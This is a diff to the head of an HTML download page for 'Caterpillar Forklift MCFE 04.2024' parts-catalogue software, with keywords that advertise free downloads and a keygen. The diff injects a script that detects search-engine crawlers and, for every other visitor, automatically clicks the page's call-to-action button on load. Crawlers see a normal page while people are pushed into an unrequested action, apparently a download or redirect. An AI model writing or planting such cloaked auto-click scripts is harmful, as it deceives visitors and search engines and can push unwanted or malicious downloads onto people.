@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Caterpillar Forklift MCFE 04.2024 (Europe)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Caterpillar Forklift MCFE 04.2024 Europe software, featuring spare parts, accessories, and repair manuals for various CAT lift trucks and warehouse equipment.">
     <meta name="keywords" content="Caterpillar Forklift MCFE 2024, Caterpillar Forklift MCFE 2024 free download, Caterpillar Forklift MCFE 04.2024 Europe, Europe Forklift Parts Catalogue, Caterpillar Forklift Spare Parts, Caterpillar Lift Truck Accessories, Caterpillar Forklift Repairs, Caterpillar Forklift Maintenance, CAT Forklift Service Manuals, CAT Forklift Bulletins, CAT 4 Wheel Battery Counterbalanced, CAT Cushion Tire Forklifts, CAT Double Pallet Handler, CAT Electric Lift Trucks, CAT Pneumatic Lift Trucks, CAT Hand Pallet Trucks, CAT Multiway Reach Truck, Caterpillar MCFE spare parts 2024, Caterpillar forklift software download, Caterpillar forklift software free download, Caterpillar forklift software keygen, Caterpillar forklift workshop manual download, Caterpillar forklift service manuals Europe, Caterpillar forklift parts PDF, CAT Rider Picker Pallet Truck, spare parts catalog free download, Caterpillar Forklift MCFE 2024 каталог запчастей скачать бесплатно, Каталог деталей погрузчиков Caterpillar скачать бесплатно, Каталог запасных частей Caterpillar погрузчик скачать">
     <style>
